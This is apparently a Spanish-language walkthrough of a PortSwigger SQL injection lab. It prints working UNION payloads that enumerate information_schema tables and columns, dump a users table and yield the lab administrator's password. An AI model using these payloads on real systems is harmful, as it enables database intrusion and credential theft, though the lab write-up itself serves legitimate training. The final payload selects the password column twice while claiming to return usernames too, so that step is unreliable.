# Lab: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user. 

![Practitioner](https://img.shields.io/badge/level-Apprentice-blue)

[SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

En este laboratorio debemos realizar los siguientes objetivos:
- Determinar la tabla que contiene usuarios y contraseñas.
- Determinar las columnas relevantes.
- Imprimir el contenido de la tabla.
- Loguearse como administrador.

[SQLi Cheet Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Iniciamos el laboratorio y nos encontramos con un shop online:
<img width="1368" height="945" alt="image" src="https://github.com/user-attachments/assets/2de87a5d-6cdd-400c-831c-3c0b2a8cdd36" />

Sabemos que tenemos el parámetro `category` vulnerable a `SQLi`. Procedemos a confirmarlo, inyectándole `'`:
<img width="1878" height="806" alt="image" src="https://github.com/user-attachments/assets/6f6c112f-af5b-49b5-985c-99dd81e8bcc7" />

Al darnos un `Internal Server Error` confirmamos que es vulnerable a SQLi ya que produjo un error de sintaxis.

`Nota`: En un escenario real podríamos hacer fuzzing para determinar qué caracter sql rompe la sintaxis.

- Determinar el número de columnas que utiliza la consulta vulnerable (tenemos título del elemento y descripción del mismo por lo que al menos tenemos 2 columnas):
Probamos con `' order by 2--` y nos arroja un código de estado 200:
<img width="1881" height="763" alt="image" src="https://github.com/user-attachments/assets/851873eb-3588-4dd8-a148-dd67435d4b7e" />

Probamos con `' order by 3--` y nos arroja 500 Internal Server Error:
<img width="1873" height="777" alt="image" src="https://github.com/user-attachments/assets/f92cd391-9e95-42b1-a363-81ee3812df73" />

Podemos confirmar que tenemos 2 columnas con nuestro metodo `UNION`:
<img width="1872" height="684" alt="image" src="https://github.com/user-attachments/assets/89a7d059-4b12-4748-9cd6-e3bb72a9a7cc" />

- Ahora procedemos a analizar el tipo de dato que tienen las columnas, probamos con cadenas:

<img width="1858" height="754" alt="image" src="https://github.com/user-attachments/assets/a6679821-d605-4861-9158-a49fc7f9fa82" />

Por lo que sabemos que las columnas aceptan cadenas como tipo de dato.

- Averiguamos la versión (sabemos que no es `Oracle`):
Probamos si es `Mircrosoft`:

<img width="1881" height="789" alt="image" src="https://github.com/user-attachments/assets/abb0d3af-ffd3-4970-88eb-84a5db074712" />

Probamos si es `PostgreSQL`:
<img width="1870" height="793" alt="image" src="https://github.com/user-attachments/assets/7bb6def5-d3ab-4341-9f72-ed08a6f96319" />

El servidor nos devuelve un código de estado 200, por lo que lo confirmamos.


- Procedemos a listar las tablas, usamos el siguiente payload:
```sql
' union select table_name, 'a' from information_schema.tables--
```
Hacemos la consulta y filtramos por `users`
<img width="1882" height="835" alt="image" src="https://github.com/user-attachments/assets/7926eee4-3745-4627-8971-34247c0b908f" />


La tabla más interesante parece ser `users_vrjlxy`.

- Procedemos a listar las columnas dentro de la tabla `users_vrjlxy`, utilizamos el siguiente payload:
```
' union select column_name, 'a' from information_schema.columns where table_name= 'users_vrjlxy'--
```
Hacemos la consulta y filtramos por `username`:
<img width="1876" height="813" alt="image" src="https://github.com/user-attachments/assets/8417ef67-0191-4557-8f8b-8feffa753e9a" />

Obtenemos el username: `username_zsnozl`.

Si filtramos por `password` obtenemos `password_pzwvoe`:
<img width="1514" height="825" alt="image" src="https://github.com/user-attachments/assets/9093bccf-29fd-4425-bb60-e7ccde699c7f" />

Ahora que tenemos el nombre de la tabla, y las columnas correspondientes a usuernames y passwords, procedemos a realizar la consulta final:
```
' UNION select password_pzwvoe, password_pzwvoe FROM users_vrjlxy--
```

Realizamos la consulta y obtenemos todas las credenciales de la tabla:
<img width="1868" height="826" alt="image" src="https://github.com/user-attachments/assets/f53a3d63-fca0-44c0-98e7-fd78c6a4c7d9" />

Para resolver el laboratorio nos logueamos como administrador con las siguientes credenciales:
- administrator
- x8owsse2xz05o62ehwzr


<img width="1679" height="771" alt="image" src="https://github.com/user-attachments/assets/0f39c971-2c40-438b-8970-8926f2d542c3" />


